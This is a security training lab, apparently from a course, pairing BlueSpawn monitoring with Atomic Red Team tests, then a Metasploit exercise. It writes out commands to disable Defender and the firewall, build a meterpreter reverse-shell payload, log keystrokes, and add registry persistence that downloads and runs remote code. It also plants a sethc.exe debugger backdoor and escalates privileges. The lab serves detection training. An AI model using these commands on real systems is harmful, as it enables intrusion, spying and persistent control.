![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---

# Atomic Red Team And Bluespawn

In this lab we will be using Bluespawn as a stand-in for an EDR system.  Normally full EDRs like Cylance and Crowdstrike are very expensive and tend not to show up in classes like this.  However, the folks at University of Virginia have done an outstanding job with BlueSpawn. 

BlueSpawn will monitor the system for "weird" behavior and note it when it occurs. For the money, it is great.

In this lab, we will be starting BlueSpawn and then running Atomic Red Team to trigger a lot of alerts.

First, we need to disable Defender. 
Start by opening up <b>Windows Powershell</b>.

<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />


Next, run the following command:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

```ps
Set-MpPreference -DisableBehaviorMonitoring $true
```

<img width="824" height="155" alt="2026-03-26_09-47" src="https://github.com/user-attachments/assets/d83571b4-0a39-4e4b-a9ef-cf6763954e2c" />


This will disable Defender for this session.

>[!NOTE]
>
>If you get angry red errors, that is Ok, it means Defender is not running.


Now, let's open a **command prompt**:

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/f62f8205-8828-4a2b-97f0-e7137ec466e5" />

 
Next, let’s change directories to tools and start Bluespawn:

```bash
cd \IntroLabs
```

```bash
BLUESPAWN-client-x64.exe --monitor --aggressiveness cursory
```

You should see something like this:

<img width="862" height="638" alt="2026-03-26_09-50" src="https://github.com/user-attachments/assets/a3419596-b4ca-4ea1-8d2a-832046873f76" />


If you made it this far, perfect! That means Bluespawn is up and running.

Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:

First, we need to open a PowerShell terminal. 

You can do this by selecting the icon in the taskbar/desktop:

<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />

Now we need to install and update Atomic Red Team. Run the following:

```bash
cd \
```

```ps
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics -Force
```

>[!NOTE]
>
> This can take a bit. After about 120 seconds, try hitting enter to get your prompt back.

Once you see the following, you are set to move forward:

<img width="1100" height="292" alt="2026-03-26_09-54" src="https://github.com/user-attachments/assets/41cb6202-0911-480c-bb68-0953bf66a213" />


Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:

```ps
cd C:\AtomicRedTeam\invoke-atomicredteam\
```

Then, install the proper `yaml` modules by running the following:

```ps
Install-Module -Name powershell-yaml
```

>[!NOTE]
>
>When prompted, press Y to install the modules.

```ps
Import-Module .\Invoke-AtomicRedTeam.psm1
```


Once we do this, we need to invoke all the Atomic Tests.

>[!IMPORTANT]  
>
>Don't do this in production...  Ever.
>  
>Always run tools like Atomic Red Team on test systems.
>
>We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode. This is so you can see what the protection would have done, but it will allow the tests to finish so we are just going to run individual tests for now.

Run the following individually:

```ps
Invoke-AtomicTest T1547.004
```

More information here:

https://attack.mitre.org/techniques/T1547/004/

```ps
Invoke-AtomicTest T1543.003
```

More information here:

https://attack.mitre.org/techniques/T1543/003/

```ps
Invoke-AtomicTest T1547.001
```

More information here:

https://attack.mitre.org/techniques/T1547/001/

```ps
Invoke-AtomicTest T1546.008
```

More information here:

https://attack.mitre.org/techniques/T1546/008/


>[!TIP]
>
>If you get any “file exists” questions or errors, just select `Yes`.

It should look like this:

<img width="633" height="264" alt="2026-03-26_10-00" src="https://github.com/user-attachments/assets/3cc66d66-4156-45be-b149-e81145a1a920" />


>[!NOTE]
>
>There might be some errors when this runs. This is 
normal.

>[!IMPORTANT]
>
>We had to cross reference the old numbering with the new.
>
>You can find that mapping here:
>
>https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json
>
>![](attachments/crossreference.png)


You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:

<img width="1096" height="631" alt="2026-03-26_10-09" src="https://github.com/user-attachments/assets/135ce716-47fb-4840-b6a2-1c00c999bc87" />


Now, let’s go back to the PowerShell window and clean up:

```ps
Invoke-AtomicTest All -Cleanup
```

It should look like this:

<img width="1093" height="444" alt="2026-03-26_10-06" src="https://github.com/user-attachments/assets/2dd53a33-3c40-4cf8-9d86-bb18c3bb7ec5" />


# If you have more time

Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

<img width="74" height="91" alt="image" src="https://github.com/user-attachments/assets/685d264c-661c-4dbf-aa79-54f925cefdb1" />


Next, run the following command in the **Powershell** terminal:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

<img width="820" height="139" alt="2026-03-26_10-20" src="https://github.com/user-attachments/assets/446b50ed-75b5-4e04-a505-559833112aa1" />


This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Open **Command Prompt**

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/761a7584-f744-4f6a-926b-339891c1d5b4" />

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

```cmd
netsh advfirewall set allprofiles state off
```


Next, set a password for the Administrator account that you can remember

```bash
net user Administrator password1234
```

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Let's continue by opening an **Ubuntu** terminal

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/dc26dda4-12b8-4f03-8a07-f170e5064f8d" />



Become root:

```bash
sudo su -
```


Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:

```bash
ifconfig
```

<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />

**REMEMBER: YOUR IP WILL BE DIFFERENT**

Run the following commands to start a simple backdoor and backdoor listener: 

```bash
cd /tmp/
```



Run the following commands to start a simple backdoor and backdoor listener: 

```bash

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
```



<img width="1096" height="136" alt="2026-03-26_10-33" src="https://github.com/user-attachments/assets/cedde4be-e44e-4bab-87bb-5a683603e50f" />




Now let's start the **Metasploit** Handler

```bash
msfconsole -q
```

We are going to run the following commands to correctly set the parameters:

```bash
use exploit/multi/handler
```

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

```bash
set LHOST [Your Linux IP Address]
```

Remember, **Your IP will be different!**

```bash
exploit
```

It should look like this:

<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />




Open up a **Powershell** terminal, copy the file over from **Linux**

```ps
cd .\Desktop\
```

```ps
scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
```

Open a **Command Prompt**

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/62be252d-35ca-41a4-8ade-ba5d8a8478bb" />


Let's run the following commands to run the **"TrustMe.exe"** file.

```cmd
cd \Users\Administrator\Desktop
```
 
Then run it with the following:

```cmd
TrustMe.exe
```

Back at your Ubuntu terminal, you should have a metasploit session!

<img width="987" height="392" alt="2026-03-26_10-44" src="https://github.com/user-attachments/assets/152dd3e7-11d7-43d8-85f6-45d0870cc725" />

Now, let’s look at keystroke logging.

To learn more about this check out MITRE:

https://attack.mitre.org/techniques/T1056/

Also, below is a list of just some of the threat groups that use this technique:

<img width="1072" height="723" alt="image" src="https://github.com/user-attachments/assets/c005128b-124b-4bcc-9bf7-8516ca4be2d6" />


Run commands

meterpreter > `keyscan_start`

Go and type something on your Windows system.

meterpreter > `keyscan_dump`

![](attachments/Clipboard_2020-06-15-13-52-00.png)


Go and check Bluespawn.  Did it detect it?

Now, let’s play with registry persistence.

To learn more about this check out MITRE:

https://attack.mitre.org/techniques/T1547/

Here are just some of the groups that use this technique:

<img width="1072" height="533" alt="image" src="https://github.com/user-attachments/assets/86040c18-29cd-4d16-95dd-84e45dcb1f63" />


meterpreter > `shell`

C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`

C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`

![](attachments/Clipboard_2020-06-15-14-00-53.png)

Go and check Bluespawn.  Did it detect it?

Next, let’s play with privilege escalation.

Here is al link to more info about this from MITRE:

https://attack.mitre.org/techniques/T1543/

Here are just some of the groups that use this technique:

<img width="1087" height="489" alt="image" src="https://github.com/user-attachments/assets/41b91eb5-8505-48a3-bee0-09cbb87f9dca" />


meterpreter >`getsystem`

![](attachments/Clipboard_2020-06-15-13-52-28.png)


![](attachments/Clipboard_2020-06-15-13-56-34.png)

Go and check Bluespawn.  Did it detect it?

***                                                                 

<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/deepbluecliIntroClass/DeepBlueCLI.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/AppLocker/AppLocker.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---













